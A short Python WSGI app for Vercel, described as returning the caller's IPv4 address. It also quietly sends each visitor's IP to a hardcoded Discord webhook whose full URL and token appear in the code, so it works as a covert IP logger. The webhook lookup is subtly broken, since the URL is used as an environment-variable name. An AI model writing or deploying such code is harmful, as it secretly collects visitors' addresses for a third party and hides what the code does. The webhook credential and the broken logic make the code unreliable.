"""Vercel-compatible WSGI app that returns the caller's IPv4 address."""
from __future__ import annotations

import ipaddress
import json
import os
import urllib.request
from typing import Iterable, Tuple


IP_HEADER_CANDIDATES: Tuple[str, ...] = (
    "x-vercel-forwarded-for",
    "x-forwarded-for",
    "x-real-ip",
    "cf-connecting-ip",
    "true-client-ip",
)


def _extract_ipv4(environ: dict) -> str | None:
    for header in IP_HEADER_CANDIDATES:
        value = environ.get(f"HTTP_{header.upper().replace('-', '_')}")
        if not value:
            continue
        # X-Forwarded-For can be a list; use the first non-empty entry.
        first = value.split(",")[0].strip()
        if not first:
            continue
        try:
            ip = ipaddress.ip_address(first)
        except ValueError:
            continue
        if isinstance(ip, ipaddress.IPv4Address):
            return str(ip)
    # Fallback to remote addr if no headers are set.
    remote_addr = environ.get("REMOTE_ADDR")
    if remote_addr:
        try:
            ip = ipaddress.ip_address(remote_addr)
        except ValueError:
            return None
        if isinstance(ip, ipaddress.IPv4Address):
            return str(ip)
    return None


def _send_to_discord(ipv4: str) -> None:
    webhook_url = os.environ.get("https://discordapp.com/api/webhooks/1467318923530731542/kGr37rhwdACo7bFdZ3dUW80dpv9aHQX97XpmZ8nez7xpGCEs-HzRW-OzlKWmRRG6hCf6")
    if not webhook_url:
        return
    payload = {"content": f"IPv4: {ipv4}"}
    data = json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        webhook_url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=5):
            return
    except Exception:
        return


def app(environ: dict, start_response) -> Iterable[bytes]:
    """WSGI entrypoint for Vercel's Python runtime."""
    ipv4 = _extract_ipv4(environ)
    if ipv4:
        _send_to_discord(ipv4)
        body = f"IPv4: {ipv4}\n"
        status = "200 OK"
    else:
        body = "IPv4 not found.\n"
        status = "200 OK"

    headers = [
        ("Content-Type", "text/plain; charset=utf-8"),
        ("Content-Length", str(len(body.encode("utf-8")))),
        ("Cache-Control", "no-store"),
    ]
    start_response(status, headers)
    return [body.encode("utf-8")]
